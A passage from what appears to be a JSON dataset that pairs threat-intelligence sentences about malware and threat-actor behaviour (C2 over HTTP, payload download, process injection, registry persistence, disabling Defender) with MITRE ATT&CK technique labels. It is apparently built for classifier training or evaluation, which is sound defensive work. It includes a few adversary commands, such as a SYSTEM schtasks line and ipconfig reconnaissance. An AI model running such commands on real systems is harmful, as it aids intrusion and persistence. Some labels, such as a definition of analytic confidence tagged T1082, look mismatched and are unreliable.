    "type": "text",
    "text": "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The HTA file uses curl utility to download",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated drives OS type OS version and other information using a script or the systeminfo command.(Citation: Securelist Kimsuky Sept 2013)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has dropped payload and configuration files to disk.  has also been used to download and execute additional payloads.(Citation: TrendMicro PE_URSNIF.A2)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP to communicate with C2 nodes.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.(Citation: ESET Gazer Aug 2017)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.(Citation: MSTIC NOBELIUM Mar 2021)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "server component can download remote files.(Citation: FireEye Periscope March 2018)(Citation: Lee 2013)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files and directories just prior to encryption.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can open a reverse shell on the system to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "and the following data is written into registry:",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can download files to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can be configured to use HTTP for command and control.(Citation: Dell TG-3390)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute components of VirtualBox.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used valid compromised credentials to gain access to victim environments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has created new services to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Write a registry Run key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command to traverse the files and directories in a given path. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "lures the user to open a document.lnk file which will execute the malicious DLL loader",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "automatically searches for files on local drives based on a predefined list of file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has modules for executing scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "communicates to its C2 server over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used valid accounts for initial access and privilege escalation.(Citation: FireEye APT33 Webinar Sept 2017)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "DeleteFile",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can provide a remote shell. One version of  uses batch scripting.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has deleted existing logs and exfiltrated file archives from a victim.(Citation: SecureWorks BRONZE UNION June 2017)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "it creates a scheduled task that executes the updated routine, which triggers at log-on and every 30 minutes.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to download files to compromised machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses command-line interaction to search files and directories.(Citation: Mandiant Operation Ke3chang November 2014)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used scripts to collect the host's network topology.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory the current user's desktop the Program Files directory and Recent.(Citation: Kaspersky Turla)(Citation: ESET ComRAT May 2020)  RPC backdoors have also searched for files matching the lPH*.dll pattern.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a module to inject a PE binary into a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The current username home folder",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "collects endpoint information using the systeminfo command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can perform Registry operations.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This backdoor executes arbitrary PHP code sent in POST request parameters.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used been observed deleting scripts once used.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "will attempt to detect if the infected host is configured to a proxy. If so  will send beacons via an HTTP POST request.  will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has saved information to a random temp file before exfil.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used administrator credentials for lateral movement in compromised networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "used  to collect usernames from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect information on the Windows directory and searches for compressed RAR files on the host.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware and tools including through the use of `certutil` onto a compromised host .(Citation: Dell TG-3390)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to download malicious code.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address of a compromised host.(Citation: Red Canary NETWIRE January 2020)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "After the writing in the registry has been completed",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has run whoami on a victim.(Citation: Palo Alto OilRig May 2016)(Citation: Palo Alto OilRig Oct 2016)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RDP connection established",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The payload is implanted into a newly created suspended process (a new instance of the current executable) using one of the most popular techniques of PE injection: Process Hollowing",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected files locally before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers network configuration information as well as the ARP cache.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the victim PC name and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "is generated from the system username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The   module can iterate over all network interfaces on the host and retrieve the name description MAC address DNS suffix DNS servers gateways IPv4 addresses and subnet masks.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "walks through all mapped file systems and collects files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses the command line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Is able to steal/gather information on CPU type, screen resolution",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to discover processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has a command to launch a file browser or explorer on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "execute it with rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTPS for C2 using the Microsoft Graph API.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to check for blocklisted computer names on infected endpoints.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete a specified file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect DNS information from the targeted system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories creating directories listing directory contents reading and writing to files retrieving file attributes and retrieving volume information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the domain and the MAC and IP addresses of an infected machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has modified the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute from autocheck autochk * to autocheck autoche *.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has monitored critical processes to ensure resiliency. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "collects the external IP address from the system. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "uses ipconfig /all and route PRINT to identify network adapter and interface information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "is able to create hidden scheduled tasks for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "searches for files on local drives based on a predefined list of file extensions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can be loaded into the Startup folder (`%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk`) as a Shortcut file for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded a variety of modules and payloads to the compromised host including  and NetSupport Manager RAT-based malware.(Citation: Unit 42 Valak July 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "executed by rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.(Citation: Red Canary Qbot)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "13 Copy file to adbFle.tmp, and upload it to the C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files used during infection.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can conduct command and control over protocols like HTTP and HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.(Citation: TrendMicro Patchwork Dec 2017)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can collect the user name from a victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell downloading malware",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to list its directory and logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected the MAC address of a compromised host; it can also use GetAdaptersInfo to identify network adapters.(Citation: TrendMicro Taidoor)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of the batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can gather system information from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "they also used tasklist",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "provides command-line access to the compromised system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can explore files on a compromised system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "is a batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "checks its directory location in an attempt to avoid launching in a sandbox.(Citation: SecureList SynAck Doppelgnging May 2018)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has collected the username from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can download files and execute them on a victim's system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Detect and Identify source IP",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "loads it using rundll32",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can perform credential dumping from memory to obtain account and password information.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "malware running via Rundll32",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has created shortcuts in the Startup folder to establish persistence.(Citation: Anomali Pirate Panda April 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "a tool called “anti.exe”\nto stop Windows Update service and terminate EDR and Antivirus\nrelated services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Attempts to disable or modify endpoint security, such as Microsoft Defender, on compromised devices.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses WMI to perform discovery techniques.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "identifies files matching certain file extension and copies them to subdirectories it created.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used EnumProcesses() to identify how many process are running in the environment.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The  loader can support the `Dij` command which gives it the ability to inject DLLs into the memory of other processes.(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP and HTTPS in communications with remote hosts.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "modifying the Local Security Authority (LSA)\nregistry key value",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The dll is run using the command “rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has discovered system information including memory status CPU frequency OS versions and volume serial numbers.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "from an injected process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has collected a list of running processes on the infected system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "domain and local accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "collects the network adapters IP and MAC address as well as IP addresses of the network adapters default gateway primary/secondary WINS DHCP and DNS servers and saves them into a log file.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "We’ve seen the adversary staging data on a remote system or on the local system.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure victims into executing malicious files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "runs it via rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has searched the Image File Execution Options registry key for Debugger within every subkey.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated sessions and users on a remote host and identified privileged users logged into a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "using a renamed copy of rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can stage stolen browser data in `C:\\\\Windows\\\\Temp\\\\cup.tmp` and keylogger data in `C:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK`.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Use scheduled tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used various forms of spearphishing in attempts to get users to open malicious attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can inject its backdoor as a portable executable into a target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can stage local data in the Windows Registry.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute binaries scripts and Control Panel Item files and to execute code via proxy to avoid triggering security tools.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve lists of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has called GetLogicalDrives to emumerate all mounted drives and GetDriveTypeW to determine the drive type.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "commands to download an Emotet DLL onto the computer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used multiple native Windows APIs to execute and conduct process injections.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "to download and execute a remote “note.hta”:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "And that Run key references a different Registry key",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used the command ls /etc | egrep -efedora\\*|debian\\*|gentoo\\*|mandriva\\*|mandrake\\*|meego\\*|redhat\\*|lsb-\\*|sun-\\*|SUSE\\*|release to determine which Linux OS version is running.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has relied upon users to execute a malicious attachment delivered via spearphishing.(Citation: Malwarebytes Saint Bot April 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "An example of the creation of such a scheduled task by the adversary:\nschtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st 06:59:00",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files related to its dynamic debugger feature.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The attackers may use wmic to obtain information and run various commands,",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Use a previously compromised domain admin account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "command line argument",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses systeminfo on a victims machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use known credentials to run commands and spawn processes as a domain user account.(Citation: cobaltstrike manual)(Citation: CobaltStrike Daddy May 2017)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "this executable then downloads and executes additional payloads",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WMI was used for running commands on remote systems",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "C :\\Windows\\system32\\cmd.exe /C shell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "injects a DLL for  into the explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "performs the functions of LoadLibrary and calls the loaded module’s startModule export.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has executed a batch script designed to disable Windows Defender on a compromised host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of running processes.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "used cmd.exe for execution.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands on the victim's machine.(Citation: US-CERT Volgmer Nov 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network including Outlook Express (msinm.exe) Outlook (outlook.exe) Internet Explorer (iexplore.exe) and Firefox (firefox.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has collected from a victim machine the system name processor information OS version and disk information including type and free space available.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use RegOpenKeyW to access the Registry.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once a file is uploaded  will delete it from the machine. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to send and receive files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the different processes they injected into",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "obtains the target's IP address and local network segment.(Citation: Palo Alto Shamoon Nov 2016)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can install itself as a new service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can remove files from the compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has discovered the local disks attached to the system and their hardware information including manufacturer and model as well as the OS versions of systems connected to a targeted network.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "executes these files through WMIC.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used valid credentials with various services during lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download files to the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "downloads and executes",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can gather information on the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The macro contains malicious code that attempts to download content from a remote server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A new batch file, localdisk.bat, was also executed",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can list files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can also manage the system power policies registry keys to set the minimum and maximum sleep times and the lid open and close action policy.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can delete scripts from a subdirectory of /tmp after they are run.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525. It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can be used to collect MAC addresses.(Citation: Debian nbtscan Nov 2019)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "checks for connectivity to other resources in the network. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used  to execute commands on the system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "injects into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "each data byte in the HTTP based C2 communication,",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "actors used the following command after exploiting a machine with  malware to acquire information about local networks: ipconfig /all >> %temp%\\download",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can delete malware and associated artifacts from the victim.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "used a compromised account to create a scheduled task on a system.(Citation: FireEye APT41 Aug 2019)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded a variety of modules and payloads to the compromised host including IcedID and .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used administrator credentials to gain access to restricted network segments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "cmd.exe /c start",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has collected the domain name of a compromised network.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "From these injected processes,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Allows known Windows Defender Threat IDs to execute",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to obtain a process listing.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Downloading, decrypting, and executing a backdoor payload from an attacker-controlled server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to steal information from the compromised or targeted host",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can run shellcode it injects into a newly created process.",
